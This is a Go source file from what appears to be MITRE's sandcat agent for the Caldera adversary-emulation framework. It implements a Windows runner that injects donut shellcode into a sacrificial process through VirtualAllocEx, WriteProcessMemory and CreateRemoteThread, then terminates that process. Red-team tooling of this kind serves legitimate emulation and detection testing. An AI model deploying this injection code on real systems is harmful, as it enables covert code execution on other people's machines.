// +build windows

package donut

import (
	"syscall"
	"unsafe"

	"github.com/mitre/sandcat/gocat/util"
)

// Runner runner
func Runner(donut []byte, handle syscall.Handle, stdout syscall.Handle, stdoutBytes *[]byte, stderr syscall.Handle, stderrBytes *[]byte, eventCode *uint32) (bool, error) {

	go ReadFromPipes(stdout, stdoutBytes, stderr, stderrBytes)

	address, err := VirtualAllocEx(handle, 0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READ)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	var bytesWritten uintptr

	_, err = WriteProcessMemory(handle, address, (uintptr)(unsafe.Pointer(&donut[0])), uintptr(len(donut)), &bytesWritten)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	var threadHandle syscall.Handle

	threadHandle, err = CreateRemoteThread(handle, nil, 0, address, 0, 0, 0)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	*eventCode, err = WaitForSingleObject(threadHandle, 0xFFFFFFFF)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//Close the thread handle
	err = syscall.CloseHandle(threadHandle)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//Terminate the sacrificial process
	err = TerminateProcess(handle, 0)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//close Process Handle
	err = syscall.CloseHandle(handle)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//close stdout Handle
	err = syscall.CloseHandle(stdout)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	//close stderr Handle
	err = syscall.CloseHandle(stderr)
	if util.CheckErrorMessage(err) {
		return false, err
	}

	return true, err
}

// IsAvailable does a donut runner exist
func IsAvailable() bool {

	return true
}